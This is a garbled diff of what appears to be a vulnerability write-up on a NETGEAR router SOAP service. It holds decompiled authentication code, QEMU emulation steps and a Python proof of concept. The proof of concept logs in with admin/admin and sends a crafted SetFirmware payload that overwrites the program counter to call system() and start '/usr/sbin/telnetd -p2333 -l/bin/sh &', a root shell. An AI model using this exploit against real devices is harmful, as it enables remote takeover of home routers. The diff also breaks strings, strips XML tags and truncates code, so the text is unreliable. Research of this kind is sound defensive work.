@@ -37,17 +37,14 @@ v11 = stristr(http_v4, "SOAPAction:");
     }
   }
   serverIdx = v8;
-```
-
-
-
-```
 cookie = stristr(http_v4, "Cookie:");
   v21 = stristr(http_v4, "SOAPAction:");
   if ( v21 && *(v21 - 2) == 'r' && *(v21 - 1) == 'n' && (a1 = v21, v41 = strchr(v21, *(v21 - 2)), (v42 = v41) != 0) )
   {
     *v41 = v20;
-    login = stristr(a1, "service:DeviceConfig:1#SOAPLogin") == 0;// service:DeviceConfig:1#SOAPLogin
+    login = stristr(a1, "service:
+DeviceConfig:1#SOAPLogin") == 0;// service:
+DeviceConfig:1#SOAPLogin
     *v42 = 'r';
   }
   else
@@ -67,11 +64,23 @@ Login_63:
     v44 = inet_ntoa((struct in_addr)int_addr_v6);
     v45 = (const char *)acosNvramConfig_get((int)"lan_ipaddr");
     if ( strcmp(v44, v45)
-      && (strncmp(action_v13, " urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate", 0x3Au)
-       && strncmp(action_v13, " "urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate"", 0x3Cu)
+      && (strncmp(action_v13, " urn:
+NETGEAR-ROUTER:
+service:
+ParentalControl:1#Authenticate", 0x3Au)
+       && strncmp(action_v13, " "urn:
+NETGEAR-ROUTER:
+service:
+ParentalControl:1#Authenticate"", 0x3Cu)
        || serverIdx != 7)
-      && (strncmp(action_v13, " urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin", 0x34u)
-       && strncmp(action_v13, " "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"", 0x36u)
+      && (strncmp(action_v13, " urn:
+NETGEAR-ROUTER:
+service:
+DeviceConfig:1#SOAPLogin", 0x34u)
+       && strncmp(action_v13, " "urn:
+NETGEAR-ROUTER:
+service:
+DeviceConfig:1#SOAPLogin"", 0x36u)
        || serverIdx != 1) )
     {
       v94 = 0;
@@ -129,11 +138,6 @@ Unauthor_61:
     resp_state = 401;
     return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);
   }
-```
-
-
-
-```
 Docontrol_35:
   if ( serverIdx == -1
     || (v29 = ServerNamePTR,
@@ -148,7 +152,8 @@ Unauthor_61:
     return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);
   }
   v33 = strlen(v29);
-  strcat(soapAction, "urn:NETGEAR-ROUTER");
+  strcat(soapAction, "urn:
+NETGEAR-ROUTER");
   v34 = strlen(soapAction);
   memcpy(&soapAction[v34], v31, &v32[v33] - v31);
   strcat(soapAction, ":1");
@@ -162,17 +167,13 @@ Unauthor_61:
     resp_state = v36;
     return respond(0, 0x20000, XMLBODY, int_fd_v5, resp_state);
   }
-```
-
-
-
-```
 serverIdx_v6 = serverIdx;
 http_v7 = http;
 flag_a1 = ifssl;
 fd = int_fd;
 in_addr_v8 = in_addr;
-printf("%s():type=%dn", "sa_processResponse", serverIdx);
+printf("%s():
+type=%dn", "sa_processResponse", serverIdx);
 switch ( serverIdx_v6 )
 {
     case 0:
@@ -187,38 +188,47 @@ switch ( serverIdx_v6 )
         {...}
 }
 /*
-.data:00083B88 ; specialAction ActionList[400]
-.data:00083B88 ActionList      DCD 0, 0x49BB8, 1, 0x47F68, 2, 0x49BC0, 3, 0x49BD4, 4
-.data:00083B88                                         ; DATA XREF: GotName:loc_2A91C↑o
-.data:00083B88                                         ; .text:off_2A960↑o
-.data:00083B88                 DCD 0x48578, 5, 0x49BE8, 6, 0x49BFC, 7, 0x49C10, 8, 0x49C18
-.data:00083B88                 DCD 9, 0x49C24, 0xA, 0x49C30, 0xB, 0x49C3C, 0xC, 0x49C4C
-.data:00083B88                 DCD 0x9B, 0x49C60, 0xD, 0x49C78, 0xE, 0x49C88, 0xF, 0x49C9C
-.data:00083B88                 DCD 0x10, 0x49CA8, 0x11, 0x49CB8, 0x12, 0x49CC8, 0x13
-.data:00083B88                 DCD 0x49CD8, 0x14, 0x49CF4, 0x15, 0x49D0C, 0x16, 0x49BB8
-.data:00083B88                 DCD 0x17, 0x49BB8, 0x18, 0x49BB8, 0x19, 0x49BB8, 0x1A
-.data:00083B88                 DCD 0x49D24, 0x1B, 0x49D34, 0x1C, 0x49D44, 0x1D, 0x49D58
-.data:00083B88                 DCD 0x1E, 0x49D68, 0x1F, 0x49D7C, 0x20, 0x49D8C, 0x21
-.data:00083B88                 DCD 0x49D9C, 0x22, 0x49DB0, 0x23, 0x49DC4, 0x24, 0x49DD8
-.data:00083B88                 DCD 0x25, 0x49DF0, 0x26, 0x49E0C, 0x27, 0x49E14, 0x28
-.data:00083B88                 DCD 0x49E28, 0x29, 0x49E34, 0x2A, 0x48250, 0x2B, 0x49E40
-.data:00083B88                 DCD 0x2C, 0x49E54, 0x2D, 0x49E6C, 0x2E, 0x49E80, 0x2F
+.data:
+00083B88 ; specialAction ActionList[400]
+.data:
+00083B88 ActionList      DCD 0, 0x49BB8, 1, 0x47F68, 2, 0x49BC0, 3, 0x49BD4, 4
+.data:
+00083B88                                         ; DATA XREF: GotName:
+loc_2A91C↑o
+.data:
+00083B88                                         ; .text:
+off_2A960↑o
+.data:
+00083B88                 DCD 0x48578, 5, 0x49BE8, 6, 0x49BFC, 7, 0x49C10, 8, 0x49C18
+.data:
+00083B88                 DCD 9, 0x49C24, 0xA, 0x49C30, 0xB, 0x49C3C, 0xC, 0x49C4C
+.data:
+00083B88                 DCD 0x9B, 0x49C60, 0xD, 0x49C78, 0xE, 0x49C88, 0xF, 0x49C9C
+.data:
+00083B88                 DCD 0x10, 0x49CA8, 0x11, 0x49CB8, 0x12, 0x49CC8, 0x13
+.data:
+00083B88                 DCD 0x49CD8, 0x14, 0x49CF4, 0x15, 0x49D0C, 0x16, 0x49BB8
+.data:
+00083B88                 DCD 0x17, 0x49BB8, 0x18, 0x49BB8, 0x19, 0x49BB8, 0x1A
+.data:
+00083B88                 DCD 0x49D24, 0x1B, 0x49D34, 0x1C, 0x49D44, 0x1D, 0x49D58
+.data:
+00083B88                 DCD 0x1E, 0x49D68, 0x1F, 0x49D7C, 0x20, 0x49D8C, 0x21
+.data:
+00083B88                 DCD 0x49D9C, 0x22, 0x49DB0, 0x23, 0x49DC4, 0x24, 0x49DD8
+.data:
+00083B88                 DCD 0x25, 0x49DF0, 0x26, 0x49E0C, 0x27, 0x49E14, 0x28
+.data:
+00083B88                 DCD 0x49E28, 0x29, 0x49E34, 0x2A, 0x48250, 0x2B, 0x49E40
+.data:
+00083B88                 DCD 0x2C, 0x49E54, 0x2D, 0x49E6C, 0x2E, 0x49E80, 0x2F
 */
-```
-
-
-
-```
 if ( key_idx != 197 )
     goto LABEL_264;
-v54 = stristr(http_v7, "<Username");// login check
-v55 = v54;
-if ( v54 )
-{
-    v55 = stristr(v54, ">");
+v54 = stristr(http_v7, "");
     if ( v55 )
     {
-        v56 = stristr(http_v7, "</Username>");
+        v56 = stristr(http_v7, "");
         if ( v56 )
         {
             *v56 = 0;
@@ -232,13 +242,10 @@ if ( v54 )
         }
     }
 }
-v58 = stristr(http_v7, "<Password");
-if ( !v58 )
-    goto LABEL_836;
-a3 = stristr(v58, ">");
+v58 = stristr(http_v7, "");
 if ( !a3 )
     goto LABEL_836;
-v59 = stristr(http_v7, "</Password>");
+v59 = stristr(http_v7, "");
 if ( !v59 )
     goto LABEL_836;
 *v59 = 0;
@@ -259,28 +266,21 @@ if ( !v62 )                         // account rig
         v63 = 503;
     resp_state = v63;
 }
-```
-
-
-
-```
 def SOAPLogin(http_username: str, passwd: str) -> str:
     header = {
-        "SOAPACTION": "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"
+        "SOAPACTION": "urn:
+NETGEAR-ROUTER:
+service:
+DeviceConfig:1#SOAPLogin"
     }
     body = '<?xml version="1.0"?>rn'
-    body += '<Username>admin</Username>rn'
-    body += '<Password>admin</Password>rn'
+    body += 'adminrn'
+    body += 'adminrn'
 
     respnd = requests.post(url=URL, headers=header, data=body)
     cookie = respnd.headers.get('Set-Cookie')
     print(cookie)
     return cookie
-```
-
-
-
-```
 #!/bin/bash
 
 qemu-system-arm -M vexpress-a9 
@@ -288,17 +288,20 @@ qemu-system-arm -M vexpress-a9 
     -initrd initrd.img-3.2.0-4-vexpress 
     -drive if=sd,file=debian_wheezy_armhf_standard.qcow2
     -append "root=/dev/mmcblk0p2 console=ttyAMA0" 
-    -net user,hostfwd=tcp::2222-:22,hostfwd=tcp::5555-:5555,hostfwd=tcp::5000-:5000 -net nic 
+    -net user,hostfwd=tcp::
+2222-:22,hostfwd=tcp::
+5555-:
+5555,hostfwd=tcp::
+5000-:
+5000 -net nic 
     -nographic
-```
-
-
-
-```
 root@debian-armhf:~# cd squashfs-root/
-root@debian-armhf:~/squashfs-root# mount --bind /proc ./proc
-root@debian-armhf:~/squashfs-root# mount --bind /dev ./dev/
-root@debian-armhf:~/squashfs-root# chroot . ./bin/busybox sh
+root@debian-armhf:~/squashfs-root
+# mount --bind /proc ./proc
+root@debian-armhf:~/squashfs-root
+# mount --bind /dev ./dev/
+root@debian-armhf:~/squashfs-root
+# chroot . ./bin/busybox sh
 
 BusyBox v1.7.2 (2021-08-26 10:32:44 CST) built-in shell (ash)
 Enter 'help' for a list of built-in commands.
@@ -364,11 +367,6 @@ Setting upnp_portmap_entry = 0
 Getting upnp_turn_on
 Getting lan_ipaddr
 Getting lan_ipaddr
-```
-
-
-
-```
 v130 = v7 == 0xFF13;
   dword_EC044[19 * v83] = 0xFF3B;
   firmdataDecry = (char *)malloc(0x400000u);
@@ -403,44 +401,51 @@ v130 = v7 == 0xFF13;
     memcpy(&v13, v1, len);
     calculate_checksum(v3, v3, v3); 
 /*
-.data:000841C8 ; specialArg ArgList[]
-.data:000841C8 ArgList         DCD 0xFF00              ; DATA XREF: sub_F39C+28↑o
-.data:000841C8                                         ; sub_F39C+60↑o ...
-.data:000841CC off_841CC       DCD aNewenable          ; DATA XREF: firmStuff+58↑r
-.data:000841CC                                         ; "NewEnable"
-.data:000841D0 dword_841D0     DCD 1                   ; DATA XREF: firmStuff+60↑r
-.data:000841D4                 DCD 0xFF01
-.data:000841D8 off_841D8       DCD aNewconnectiont     ; DATA XREF: firmStuff+2DC↑r
-.data:000841D8                                         ; "NewConnectionType"
-.data:000841DC dword_841DC     DCD 0x10                ; DATA XREF: firmStuff+2E4↑r
-.data:000841E0                 DCD 0xFF02
-.data:000841E4                 DCD 0x4AB1C
-.data:000841E8                 DCD 0x40
+.data:
+000841C8 ; specialArg ArgList[]
+.data:
+000841C8 ArgList         DCD 0xFF00              ; DATA XREF: sub_F39C+28↑o
+.data:
+000841C8                                         ; sub_F39C+60↑o ...
+.data:
+000841CC off_841CC       DCD aNewenable          ; DATA XREF: firmStuff+58↑r
+.data:
+000841CC                                         ; "NewEnable"
+.data:
+000841D0 dword_841D0     DCD 1                   ; DATA XREF: firmStuff+60↑r
+.data:
+000841D4                 DCD 0xFF01
+.data:
+000841D8 off_841D8       DCD aNewconnectiont     ; DATA XREF: firmStuff+2DC↑r
+.data:
+000841D8                                         ; "NewConnectionType"
+.data:
+000841DC dword_841DC     DCD 0x10                ; DATA XREF: firmStuff+2E4↑r
+.data:
+000841E0                 DCD 0xFF02
+.data:
+000841E4                 DCD 0x4AB1C
+.data:
+000841E8                 DCD 0x40
 
 */
-```
-
-
-
-```
 2F134                 MOV             R0, SP  ; command
 2F138                 BL              system
-```
-
-
-
-```
 import sys, base64, requests, struct
 
-URL = 'http://localhost:5000/soap/server_sa'
+URL = 'http://localhost:
+5000/soap/server_sa'
 
 def SOAPLogin(http_username: str, passwd: str) -> str:
     header = {
-        "SOAPACTION": "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"
+        "SOAPACTION": "urn:
+NETGEAR-ROUTER:
+service:
+DeviceConfig:1#SOAPLogin"
     }
     body = '<?xml version="1.0"?>rn'
-    body += '<Username>admin</Username>rn'
-    body += '<Password>admin</Password>rn'
+    body += 'adminrn'
+    body += 'adminrn'
 
     respnd = requests.post(url=URL, headers=header, data=body)
     cookie = respnd.headers.get('Set-Cookie')
@@ -449,7 +454,10 @@ def SOAPLogin(http_username: str, passwd: str) -> str:
 
 def SetFirmware(cookie: str):
     header = {
-        "SOAPACTION": "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetFirmware",
+        "SOAPACTION": "urn:
+NETGEAR-ROUTER:
+service:
+DeviceConfig:1#SetFirmware",
         "Cookie": f'{cookie}'
     }
     firmData = b'*#$^' + b'x00' + b'x00' + b'x01' + b'x00'
@@ -465,14 +473,11 @@ def SetFirmware(cookie: str):
     2F134                 MOV             R0, SP  ; command
     2F138                 BL              system
     """
-    firmData += struct.pack('<I', 0x2F134)      #PC
-    firmData += b'/usr/sbin/telnetd -p2333 -l/bin/sh &'
-
-    body = b''
-    body += b'<s:Body>rn'
+    firmData += struct.pack('rn'
     body += b'<NewFirmware>%s'%(base64.b64encode(firmData))
     body += b'</NewFirmware>'
-    body += b'</s:Body>rn'
+    body += b'</s:
+Body>rn'
     
 
     respn = requests.post(url=URL, headers=header, data=body)
